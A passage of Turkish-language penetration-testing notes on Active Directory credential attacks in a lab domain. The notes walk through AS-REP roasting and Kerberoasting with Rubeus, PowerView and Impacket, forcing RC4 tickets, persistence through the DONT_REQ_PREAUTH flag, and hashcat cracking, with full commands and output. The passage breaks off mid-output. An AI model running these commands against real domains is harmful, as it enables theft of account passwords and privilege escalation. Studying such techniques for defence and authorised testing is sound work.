Bu bilgilerle, **Rubeus** aracı **AS-REP**’i offline **hash cracking** için uygun formatta almak amacıyla kullanılabilir. Bu saldırı herhangi bir **domain user context** gerektirmez ve **Kerberos pre-authentication** etkin olmayan bir hesabın yalnızca adını bilerek gerçekleştirilebilir.

```
PS C:\Tools> .\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt
 ______ _
 (_____ \ | |
 _____) )_ _| |__ _____ _ _ ___
 | __ /| | | | _ \| ___ | | | |/___)
 | | \ \| |_| | |_) ) ____| |_| |___ |
 |_| |_|____/|____/|_____)____/(___/
 v1.5.0
[*] Action: AS-REP roasting
[*] Target User : jenna.smith
[*] Target Domain : inlanefreight.local
[*] Target DC : dc01.inlanefreight.local
[*] Using domain controller: dc01.inlanefreight.local
(fe80::c872:c68d:a355:e6f3%11)
[*] Building AS-REQ (w/o preauth) for: 'inlanefreight.local\jenna.smith'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
 [email protected]
:9369076320<SNIP>


```


### Hash Cracking

Araç, çeşitli **TGT**’lere bağlı **hash** listesini döndürür. Geriye kalan tek şey, **Hashcat** kullanarak bu farklı hesaplara ait **clear text password**’ü elde etmeye çalışmaktır. **Hashcat** için **hash-mode** değeri **18200**’dür (**Kerberos 5, etype 23, AS-REP**).

```
C:\Tools\hashcat-6.2.6> hashcat.exe -m 18200 C:\Tools\hashes.txt C:\Tools\rockyou.txt -O

hashcat (v6.2.6) starting
OpenCL API (OpenCL 2.1 WINDOWS) - Platform #1 [Intel(R) Corporation]
====================================================================
* Device #1: AMD EPYC 7401P 24-Core Processor, 2015/4094 MB (511 MB
allocatable), 4MCU
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13
rotates
Rules: 1
Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt
Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.
Host memory required for this attack: 0 MB
Dictionary cache hit:
* Filename..: C:\Tools\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384
[email protected]:c4caff1049fd667...9b96189d8804:dancing_queen101
<SNIP>

```


Görüldüğü gibi, **Hashcat** iki **ASREPRoastable** kullanıcıdan birinin **password**’ünü başarıyla kırdı. Gerçek bir senaryoda, bu kullanıcının hesabının **domain** içinde bize **initial foothold** sağlayıp sağlamayacağını, **lateral movement** için kullanılabilir olup olmadığını veya **privilege escalation** için yardımcı olup olamayacağını araştırabiliriz.


### PowerView ile DONT_REQ_PREAUTH ayarlama

Bir hesap üzerinde **`GenericAll`** ayrıcalıklarına sahip olduğumuzu fark edersek, hesap şifresini sıfırlamak yerine **`DONT_REQ_PREAUTH`** bayrağını etkinleştirerek bu hesap için **hash** isteği gönderebilir ve kırmayı deneyebiliriz. Bunu yapmak için **PowerView** modülünü kullanabiliriz (victim hesabının gerçek kullanıcı adıyla "userName" yerine geçirdiğinizden emin olun):

```
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Set-DomainObject -Identity userName -XOR @{useraccountcontrol=4194304} -Verbose

VERBOSE: search base:
LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: Get-DomainObject filter string: (&(|(|
(samAccountName=userName)(name=userName)(displayname=userName))))
VERBOSE: XORing 'useraccountcontrol' with '4194304' for
object 'userName
```

Bu saldırıyı bir Windows hostundan nasıl gerçekleştireceğimizi gördük, şimdi bir Linux makinesinden AS-REPRoasting saldırısı gerçekleştirmeyi ele alacağız.


### AS-REPRoasting from Linux

Impacket'in [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) **script**'i, UAC değeri DONT_REQ_PREAUTH olarak ayarlanmış kullanıcıları listelemek için kullanılabilir.

Not: Linux üzerinde Kerberos ile çalışırken, hedefin DNS sunucusunu kullanmamız veya hedeflediğimiz **domain** için ilgili DNS girişleriyle **host**'umuzu yapılandırmamız gerekir. Yani, saldırıya geçmeden önce /etc/hosts dosyasında **domain**/**Domain Controller** için bir giriş yapmamız gerekir.


### AS-REPRoastable Users Enumeration

```
GetNPUsers.py inlanefreight.local/pixis
Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth
Corporation
Name MemberOf
PasswordLastSet LastLogon UAC
----------- --------------------------------------------------- --------
------------------ -------------------------- --------
amber.smith 2020-07-
27 21:35:52.333183 2020-07-28 20:34:15.215302 0x410220
jenna.smith CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-
27 21:35:57.901421 <never> 0x410220

```

Şimdi, savunmasız hesapların bir listesini elde ettiğimize göre, komutumuza `-request` parametresini ekleyerek bu hesapların hash'lerini Hashcat formatında talep edebiliriz.


### Requesting AS-REPRoastable Hashes

```
GetNPUsers.py inlanefreight.local/pixis -request
Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth
Corporation
Name MemberOf
PasswordLastSet LastLogon UAC
----------- --------------------------------------------------- --------
------------------ -------------------------- --------
amber.smith 2020-07-
27 21:35:52.333183 2020-07-28 20:34:15.215302 0x410220
jenna.smith CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL 2020-07-
27 21:35:57.901421 2020-08-12 16:20:21.383297 0x410220
[email
protected]:d28eecddc8c5e18157b3d73ec4a68aa5$2a881995d52a313d265<SNIP>
[email protected]:e65a2fa83383a0c1f189408c07fe6d32$5b0478cd94258778478
```


### Kimlik Doğrulaması Yapmadan Savunmasız Hesapları Bulmak

Eğer domain üzerinde kimlik doğrulama bilgilerimiz yoksa ama bir kullanıcı listemiz varsa, yine de ön doğrulama gerektirmeyen hesapları bulabiliriz. GetNPUsers.py kullanarak, her bir hesabı içeren dosyada arama yapabiliriz ve bu saldırıya karşı savunmasız olan en az bir hesabı tespit edebiliriz:

```
GetNPUsers.py INLANEFREIGHT/ -dc-ip 10.129.205.35 -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass

Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in
Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in
Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in
Kerberos database)
```

Bir hata alabiliriz, ancak yine de hesabın hash'ini almış oluruz:

### User Hash

```
cat /tmp/hashes.txt

$krb5asrep$23$amber.smith@INLANEFREIGHT:d28eecddc8c5e18157b3d73ec4a68aa5$2
a881995d52a313d265<SNIP>

```


### Cracking Hashes from Linux

```
hashcat -m 18200 hashes.txt rockyou.txt
hashcat (v5.1.0) starting...
<SNIP>
[email protected]:c4caff1049fd667<SNIP>9b96189d8804:dancing_queen101
<SNIP>
Session..........: hashcat
Status...........: Exhausted
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: hashes.txt
Time.Started.....: Wed Aug 12 16:37:48 2020 (18 secs)
Time.Estimated...: Wed Aug 12 16:38:06 2020 (0 secs)
Guess.Base.......: File (Tools/Cracking/Wordlists/Passwords/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 827.0 kH/s (13.72ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/2 (50.00%) Digests, 1/2 (50.00%) Salts
Progress.........: 28688770/28688770 (100.00%)
Rejected.........: 0/28688770 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $HEX[2321686f74746965] ->
$HEX[042a0337c2a156616d6f732103]
```


Şifreyi başarıyla kırdık.


### Red Team Usage

Red Team'ler, AS-REPRoasting'i iki saldırı zincirinin parçası olarak kullanabilir:

**`Persistence`:** Bu biti (yani, DONT_REQ_PREAUTH bayrağını) hesaplar üzerinde ayarlamak, saldırganların şifre değişikliği durumunda hesaplara yeniden erişim kazanmalarını sağlar. Bu, ekibin izleme kapsamı dışında olma olasılığı yüksek olan makinelerde (örneğin, Printer gibi) kalıcı erişim sağlamak için yararlıdır ve bu makinelerde herhangi bir zamanda domain'e erişim sağlama olasılığını artırır. Bu ayar, eski yönetim uygulamaları tarafından kullanılan servis hesaplarında etkinleştirilmiş olabilir ve keşfedildiğinde, mavi takım bu hesapları göz ardı edebilir.

**`Privilege Escalation`:** Bir saldırganın, bir kullanıcının şifresini bilmeden ya da sıfırlamadan, bir hesabın herhangi bir özelliğini değiştirme yetkisi olduğu birçok senaryo vardır. Şifre sıfırlamaları tehlikelidir çünkü alarm çalma olasılıkları yüksektir. Şifreyi sıfırlamak yerine, saldırganlar bu biti etkinleştirip, hesabın şifresini çözmeyi deneyebilir.

AS-REPRoasting, Pre-authentication devre dışı bırakılmış hesapların şifrelerini bulmak ve çözmek için güçlü bir tekniktir. Bu ayar yaygın değildir, ancak zaman zaman karşılaşabiliriz ve başarısı, bir hesabın şifresinin kriptografik olarak zayıf olması ve makul bir süre içinde çözülebilmesiyle (örneğin, Hashcat gibi bir araçla) doğru orantılıdır.


### Kerberoasting

Kerberoasting, bir saldırganın servis hesapları üzerinde çevrimdışı parola kırma saldırısı gerçekleştirmesine olanak tanıyan, Active Directory hesabına yönelik bir saldırıdır. Bu saldırı, ASREPRoasting'e benzer ancak önceden domain'e kimlik doğrulaması yapılmasını gerektirir. Başka bir deyişle, saldırıyı gerçekleştirebilmek için geçerli bir domain kullanıcı hesabı ve parolasına (en düşük ayrıcalıklı olanı bile) veya bir DOMAIN JOINED makinede SYSTEM (veya düşük ayrıcalıklı domain hesabı) **shell**'ine sahip olmanız gerekir. Kerberos **pre-authentication** olmayan hesaplarla ilgili bir durum vardır, bunu bu bölümde daha sonra ele alacağız.

Bir servis kaydedildiğinde, Active Directory'ye bir Service Principal Name (SPN) eklenir ve bu, gerçek bir AD Hesabına ait bir takma addır. Active Directory'de saklanan bilgiler, makine adı, port ve AD Hesabı'nın **hash**'ini içerir. Doğru yapılandırıldığında, bu SPN'lerle "Servis Hesapları" kullanılarak güçlü bir parola garanti altına alınır. Bu hesaplar makine hesapları gibidir ve kendi kendini döndüren parolalara bile sahip olabilir.

SPN'lerin, Servis Hesapları ayarlarının zor olabilmesi ve tüm satıcıların bunları desteklememesi nedeniyle, genellikle User Hesapları'na bağlı olduğunu görmek yaygındır. En kötüsü, servis hesabı, parolayı döndürmeye çalıştığında 30. günde bazı şeyleri bozabilir. Sistem Yöneticileri (ve satıcılar) için temel odak noktası kesintisiz çalışma olduğu için, genellikle "User Hesapları" kullanmaya başvururlar ki bu da, hesabın güçlü bir parola atanması koşuluyla uygundur.

Bir sızma testi sırasında, bir SPN'nin bir user hesabına bağlı olduğu ve parolanın kırılmadığı tespit edilirse, bu durum düşük öncelikli bir bulgu olarak işaret edilmeli ve bu, saldırganların çevrimdışı parola kırma saldırıları gerçekleştirmesine olanak tanıyacak şekilde not edilmelidir. Buradaki potansiyel risk, bir gün bu hesabın parolasının, bir saldırganın kırabileceği kadar zayıf bir hale gelmesidir. Bu örnekte, düşük öncelikli bir bulgunun temel amacı, müşteriye bu tür riskli eylemlerin sonuçlarını öğretmek ve bunların nasıl güvenli bir şekilde yapılabileceğini açıklamaktır.


### Technical Details

Önceki bölümlerde, özellikle bir kullanıcının bir **service**'i kullanabilmek için yaptığı **Service Ticket** (ST) isteğiyle **Kerberos**'un nasıl çalıştığını tartıştık.  

**KDC**, **TGS** isteğine yanıt verdiğinde, gönderdiği mesaj şudur:

![Pasted image 20250215200736.png](/img/user/resimler/Pasted%20image%2020250215200736.png)
Bu mesaj, kullanıcı ile **KDC** arasında paylaşılan oturum anahtarıyla tamamen şifrelenmiştir, bu nedenle kullanıcı bu anahtarı bildiğinden mesajı çözebilir. Ancak, yerleşik **TGS** **ticket** veya **Service Ticket** (ST), **private key** ile şifrelenmiştir. Bu nedenle, kullanıcı, **private key**'le şifrelenmiş bir veri parçasına sahiptir.

Bir kullanıcı, **Active Directory** ortamındaki mevcut tüm servisler için bir **Service Ticket** (ST) talep edebilir ve bu ticketları her bir **service account**'ın **private key**'iyle şifrelenmiş şekilde alabilir.

Şimdi, bir **service account**'ın **private key**'iyle şifrelenmiş bir **Service Ticket** (ST) sahibi olan kullanıcı, şifreyi düz metin olarak geri almak için çevrimdışı bir **brute-force** saldırısı gerçekleştirebilir.

Ancak, çoğu **service**, **machine account**'lar (COMPUTERNAME$) tarafından çalıştırılır ve bu hesapların 120 karakter uzunluğunda rastgele oluşturulmuş şifreleri vardır, bu da **brute-force** saldırılarını pratikte imkansız hale getirir.

Neyse ki, bazen **services**, **user account**'lar tarafından çalıştırılır. İşte bu servisler bizim ilgimizi çekiyor. Bir **user account**'ı, insan tarafından belirlenen bir şifreye sahiptir ve bu şifre, daha tahmin edilebilir olma eğilimindedir. İşte bu hesaplar **Kerberoast** saldırısının hedef aldığı hesaplar olup, **SPN accounts**'lar **RC4** şifreleme algoritmasını kullanacak şekilde ayarlandığında, ticketlar çevrimdışı çok daha kolay çözülebilir. Bazen yalnızca eski, kriptografik olarak güvenli olmayan **RC4** şifreleme algoritmasını kullanan organizasyonlarla karşılaşabiliriz. Diğer yandan, daha olgun organizasyonlar yalnızca **AES** (Advanced Encryption Standard) kullanır ve bu da güçlü bir **password-cracking rig** üzerinde bile kırılması çok daha zor olabilir.


### Manual Detection

Sonra, bir **service** sağlayan **user account**'larını (makine hesapları değil) ararız. Bir **service**'i sağlayan bir hesap, bir **Service Principal Name** (veya **SPN**)'ye sahiptir. Bu, bu hesap tarafından sağlanan mevcut **services** listesini gösteren bir LDAP özelliğidir. Eğer bu özellik boş değilse, bu hesap en az bir **service** sunmaktadır.

İşte bir **service** sağlayan **user account**'larını aramak için bir LDAP filtresi:

```
&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
```


Bu filtre, boş olmayan bir **SPN**'ye sahip kullanıcıların bir listesini döndüren bir filtredir. Küçük bir **PowerShell** script'i, bu hesapları bir ortamda otomatik olarak bulmamıza olanak tanır:

```
$search = New-Object DirectoryServices.DirectorySearcher( "")
$search.filter = "(&(objectCategory=person)(objectClass=user)
(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results)
{
 $userEntry = $result.GetDirectoryEntry()
 Write-host "User"
 Write-Host "===="
 Write-Host $userEntry.name "(" $userEntry.distinguishedName ")"
 Write-host ""
 Write-host "SPNs"
 Write-Host "===="
 foreach($SPN in $userEntry.servicePrincipalName)
 {
 $SPN
 }
 Write-host ""
 Write-host ""
}

```

Bu script, **Domain Controller**'a bağlanır ve sağladığımız filtreyle eşleşen tüm **objects**'i arar. Her sonuç, bize **object**'in adını (**Distinguished Name**) ve bu hesapla ilişkili **SPN**'lerin listesini gösterir.

```
PS C:\Users\pixis> .\FindSPNAccounts.ps1

Users
====
krbtgt ( CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL )
SPNs
====
kadmin/changepw
User
====
sqldev ( CN=sqldev,OU=Service
Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL )
SPNs
====
MSSQL_svc_dev/inlanefreight.local:1443
User
====
sqlprod ( CN=sqlprod,OU=Service
Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL )
SPNs
====
MSSQLSvc/sql01:1433
User
====
sqlqa ( CN=sqlqa,OU=Service
Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL )
SPNs
====
MSSQL_svc_qa/inlanefreight.local:1443
User
====
sql-test ( CN=sql-test,OU=Service
Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL )
SPNs
====
MSSQL_svc_test/inlanefreight.local:1443

```

Bu script, **Kerberoastable** hesapların bir listesini elde etmemizi sağlar, ancak bir **TGS** isteği yapmaz ve **brute-force** ile kırabileceğimiz **hash**'i çıkarmaz.

Ayrıca, [**Setspn**](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) **built-in** **Windows** **binary**'sini kullanarak **SPN** hesaplarını arayabiliriz.


### Automated Tools

**[PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)**, bir **SPN** ayarlanmış kullanıcıları listelemek ve ardından **Service Ticket** (ST) talep ederek çözülebilir bir **hash** çıkarmak için kullanılabilir. **SPN** ayarlanmış hesapları listelemek için aşağıdaki yöntemi kullanabiliriz:

#### PowerView ile SPN'yi numaralandırma

```
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -SPN
logoncount : 0
badpasswordtime : 12/31/1600 8:00:00 PM
description : Key Distribution Center Service Account
distinguishedname :
CN=krbtgt,CN=Users,DC=inlanefreight,DC=local
objectclass : {top, person, organizationalPerson, user}
name : krbtgt
primarygroupid : 513
objectsid : S-1-5-21-228825152-3134732153-3833540767-
502
samaccountname : krbtgt
admincount : 1
codepage : 0
samaccounttype : USER_OBJECT
showinadvancedviewonly : True
accountexpires : NEVER
cn : krbtgt
whenchanged : 5/4/2022 8:04:31 PM
instancetype : 4
objectguid : a68bfed4-1ccf-4b62-8efa-63b32841c05d
lastlogon : 12/31/1600 8:00:00 PM
lastlogoff : 12/31/1600 8:00:00 PM
objectcategory :
CN=Person,CN=Schema,CN=Configuration,DC=inlanefreight,DC=local
dscorepropagationdata : {5/4/2022 8:04:31 PM, 5/4/2022 7:49:22 PM,
1/1/1601 12:04:16 AM}
serviceprincipalname : kadmin/changepw
memberof : CN=Denied RODC Password Replication
Group,CN=Users,DC=inlanefreight,DC=local
whencreated : 5/4/2022 7:49:21 PM
iscriticalsystemobject : True
badpwdcount : 0
useraccountcontrol : ACCOUNTDISABLE, NORMAL_ACCOUNT
usncreated : 12324
countrycode : 0
pwdlastset : 5/4/2022 3:49:21 PM
msds-supportedencryptiontypes : 0
usnchanged : 12782
<SNIP>

```

Ayrıca, **PowerView**'i doğrudan **Kerberoasting** saldırısını gerçekleştirmek için de kullanabiliriz.


### Kerberoasting with PowerView

```
PS C:\Tools> Import-Module .\PowerView.ps1

PS C:\Tools> Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation

PS C:\Tools> cat .\tgs.csv "SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHex Stream","Hash" "krbtgt","CN=krbtgt,CN=Users,DC=inlanefreight,DC=local","kadmin/changepw", ,"$krb5tgs$18$*krbtgt$inlanefreight.local$kadmin/changepw*$B6D1ECE203852A0 4E57DFDD47627CDCA$D75AF1139899CA82EDA1CC6B548AACFF04DA9451F6F37E641C44F27A E2BAB86DB49F4913B5D09F447F7EEA97629A3C0FF93063F3B20273D0<SNIP>
```

Yukarıda gösterilen manuel yöntem yerine, bunu hızlıca gerçekleştirmek için **Invoke-Kerberoast** fonksiyonunu kullanabiliriz.


#### Invoke-Kerberoast

```
PS C:\Tools> Import-Module .\PowerView.ps1

PS C:\Tools> Invoke-Kerberoast

SamAccountName : adam.jones
DistinguishedName : CN=Adam
Jones,OU=Operations,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : IIS_dev/inlanefreight.local:80
TicketByteHexStream :
Hash :
$krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$IIS_dev/inlanefreight.local:80
*$D7C42CD87BEF69BA275C9642BBEA9022BE3C1<SNIP>
SamAccountName : sqldev
DistinguishedName : CN=sqldev,OU=Service
Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQL_svc_dev/inlanefreight.local:1443
TicketByteHexStream :
Hash :
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local:
1443*$29A78F89AC24EADBB4532DF066B90F1D808A5<SNIP>
SamAccountName : sqlqa
DistinguishedName : CN=sqlqa,OU=Service
Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQL_svc_qa/inlanefreight.local:1443
TicketByteHexStream :
Hash :
$krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local:14
43*$895B5A094F49081330D4AEA7C1254F37EEAD7<SNIP>
SamAccountName : sql-test
DistinguishedName : CN=sql-test,OU=Service
Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQL_svc_test/inlanefreight.local:1443
TicketByteHexStream :
Hash : $krb5tgs$23$*sqltest$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local:1443*$68F3B218
22B3C16D272F38A5658E20F580037<SNIP>
SamAccountName : sqlprod
DistinguishedName : CN=sqlprod,OU=Service
Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/sql01:1433
TicketByteHexStream :
Hash :
$krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01:1433*$EE29DA2458CA
695EC2EDE568E9918909F7A05<SNIP>

```


**Kerberoasting**'i gerçekleştirmek için başka harika (ve hızlı) bir yol da **[Rubeus](https://github.com/GhostPack/Rubeus)** aracını kullanmaktır. **Rubeus**'ün dokümantasyonunda, **[Kerberoasting](https://github.com/GhostPack/Rubeus#kerberoast)** saldırısı için çeşitli seçenekler bulunmaktadır.  

**Rubeus**'u kullanarak tüm mevcut kullanıcıları **Kerberoast** edebiliriz ve **hash**'lerini çevrimdışı kırmak için döndürebiliriz.


#### Rubeus ile Kerberoasting

```
C:\Tools> C:\Tools>Rubeus.exe kerberoast /nowrap
 ______ _
 (_____ \ | |
 _____) )_ _| |__ _____ _ _ ___
 | __ /| | | | _ \| ___ | | | |/___)
 | | \ \| |_| | |_) ) ____| |_| |___ |
 |_| |_|____/|____/|_____)____/(___/
 v2.2.2
[*] Action: Kerberoasting
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these
accounts.
[*] Target Domain : INLANEFREIGHT.LOCAL
[*] Searching path
'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&
(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)
(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
[*] Total kerberoastable users : 6
[*] SamAccountName : sqldev
[*] DistinguishedName : CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName : MSSQL_svc_dev/inlanefreight.local:1433
[*] PwdLastSet : 10/14/2022 7:00:06 AM
[*] Supported ETypes : RC4_HMAC_DEFAULT
[*] Hash :
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local:
[email
protected]*$21CF6BFCE5377C1FA957FC340261E6A3$22AC9C6E64F19D4E51E849A99DC4F
C4FCE819E376045D1310393C7D26A42FFE50607C42A5F5E038E30867855091726D5E21FC0C
6C49730EA32CE8BF95EB6158D30796D016CCF6BA7E5A8825DECFBD9D619917BC9BF7B2A6E5
3380563DDC5BF24DDEE8B38D5F869DE6682BA2C762520434027485919F8F364F8B9D84B91C
3D1EA8EECA64F5C9690276A6211F5CE6C4AEA57ADB06188BE5E538DAC82C3F7EE708188B3E
4FD452C06FA41022317E97E9B840B93E4A03E7429D60FC4F8EB7546597B516695BDEB010CA
3FEB5A25E36BEC787044DFB19117616D76DAE523248DF55DC2513C05788B27BCE31A3FF38E
820F63BB491ECCA2563799C9C4563576B22EEB703E09B68AA95EC50CD234BFDF479027415A
58C48D024611E281DDD9355FFBF02BA277B10D6D5D347BFB751FA6101FFE915A<SNIP>
```

Belirli bir kullanıcıyı **Kerberoast** etmek ve sonucu bir dosyaya yazmak için **/outfile:filename.txt** bayrağını da kullanabiliriz.

**/pwdsetafter** ve **/pwdsetbefore** argümanlarını kullanarak, şifresi belirli bir tarihte ayarlanan hesapları **Kerberoast** edebiliriz; bu bize faydalı olabilir, çünkü bazen yıllar önce şifresi belirlenmiş, mevcut password politikası dışında kalan ve nispeten kolayca kırılabilen eski hesaplarla karşılaşabiliyoruz.

**/stats** bayrağını kullanarak, herhangi bir **ticket** isteği göndermeden **Kerberoastable** hesaplar hakkında istatistikler listeleyebiliriz. Bu, bilgi toplamak ve hesap ticketlarının kullandığı şifreleme türlerini kontrol etmek için faydalı olabilir.

**`/tgtdeleg`** bayrağı, **This account supports Kerberos AES 128-bit encryption** veya **This account supports Kerberos AES 256-bit encryption** seçeneklerinin ayarlandığı hesaplarla karşılaştığımız durumlarda faydalı olabilir. Bu, bir **Kerberoasting** saldırısı gerçekleştirdiğimizde, geri dönen **AES-128** (tip 17) veya **AES-256** (tip 18) **TGS tickets** alacağımız anlamına gelir, bu da **RC4** (tip 23) **tickets**'ten çok daha zor kırılabilir. Farkı anlayacağız çünkü **RC4** şifreli bir bilet, **`$krb5tgs$23$`*** önekiyle başlayan bir **hash** döndürecekken, **AES** şifreli ticketlar bize **`$krb5tgs$18$`*** ile başlayan bir **hash** verecektir.

AES şifreleme ile şifrelenmiş hesabın **hash**'ini aldığımız durumlarda (bu daha zor kırılır), **/tgtdeleg** bayrağını **Rubeus** ile kullanarak **RC4** şifrelemesini zorlayabiliriz. Bu, bazı domain'lerde **RC4**'ün eski hizmetlerle geriye dönük uyumluluk için **built-in** bir güvenlik önlemi olarak kullanıldığı durumlarda işe yarayabilir. Başarılı olursa, **AES** şifreli bir **hash**'i kırmaya çalışmaktan çok daha hızlı, dakikalar hatta saatler içinde kırılabilecek bir **password hash** elde edebiliriz.


### Hash Cracking

**Rubeus**, farklı **TGS** **tickets** veya **Service Tickets** (ST'ler) ile ilişkilendirilmiş **hash**'lerin listesini döndürür. Geride kalan tek şey, bu hesaplarla ilişkilendirilmiş **clear text** şifreyi almak için **hashcat** kullanmaktır. **Hashcat**'in kullanacağı **hash-mode** 13100'dür (**Kerberos 5, etype 23, TGS-REP**).

### Cracking Kerberoastable Hashes with hashcat

```
C:\Tools\hashcat-6.2.6> hashcat.exe -m 13100 C:\Tools\kerb.txt C:\Tools\rockyou.txt -O

hashcat (v6.2.6) starting
OpenCL API (OpenCL 2.1 WINDOWS) - Platform #1 [Intel(R) Corporation]
====================================================================
* Device #1: AMD EPYC 7401P 24-Core Processor, 2015/4094 MB (511 MB
allocatable), 4MCU
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Hashes: 6 digests; 6 unique digests, 6 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13
rotates
Rules: 1
Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.
Host memory required for this attack: 0 MB
Dictionary cache hit:
* Filename..: C:\Tools\rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384
$krb5tgs$23$*jacob.kelly$INLANEFREIGHT.LOCAL$SVC/[email protected]*$ac3b7a50ae9b3af123888b5722c56665$cdc909a1608c1fe4e14787df62037 99f26a
```

### Hesap Parolası olmadan Kerberoasting

Daha önce bahsedildiği gibi, geçerli bir domain hesabı ve şifresi olmadan (**SYSTEM shell**/shell gibi düşük ayrıcalıklı bir hesapla domain'e bağlı bir host üzerinde) **Kerberoasting** saldırısı gerçekleştirebileceğimiz bir durum vardır. Bu, Kerberos ön-iletişim (**pre-authentication**) etkinleştirilmemiş bir hesabı bildiğimizde mümkün olabilir. Bu hesabı kullanarak, bir **TGT** talep etmek için genellikle kullanılan bir **AS-REQ** isteği ile **Kerberoastable** bir kullanıcı için **TGS ticket** talep edebiliriz. Bu işlem, isteğin **req-body** kısmını değiştirerek yapılır ve bu konu detaylı bir şekilde bu yazıda açıklanmaktadır.

Bu saldırıyı gerçekleştirebilmek için aşağıdaki bilgilere ihtiyacımız var:

1. pre-authentication devre dışı bırakılmış bir hesabın kullanıcı adı (**`DONT_REQ_PREAUTH`**).
2. Hedef **SPN** veya bir **SPN** listesi.

Kimlik doğrulaması olmadığını simüle edebilmek için, **Rubeus createnetonly** komutunu kullanacağız ve saldırıyı gerçekleştirmek için CMD penceresini kullanacağız.


### Execute Rubeus createnetonly

```
C:\Tools> Rubeus.exe createnetonly /program:cmd.exe /show
 ______ _
 (_____ \ | |
 _____) )_ _| |__ _____ _ _ ___
 | __ /| | | | _ \| ___ | | | |/___)
 | | \ \| |_| | |_) ) ____| |_| |___ |
 |_| |_|____/|____/|_____)____/(___/
 v2.2.2
[*] Action: Create Process (/netonly)
[*] Using random username and password.
[*] Showing process : True
[*] Username : FQW21FKC
[*] Domain : KNVRD2SG
[*] Password : IL6X2VCC
[+] Process : 'cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID : 6428
[+] LUID : 0x10885a
```

Açılan yeni CMD penceresinden saldırıyı gerçekleştireceğiz; **Kerberoast** seçeneğini çalıştırmaya çalışırsak, kimlik doğrulaması yapılmadığı için başarısız olacaktır.


### **/nopreauth** olmadan Saldırıyı Gerçekleştirme

```
C:\Tools> Rubeus.exe kerberoast
 ______ _
 (_____ \ | |
 _____) )_ _| |__ _____ _ _ ___
 | __ /| | | | _ \| ___ | | | |/___)
 | | \ \| |_| | |_) ) ____| |_| |___ |
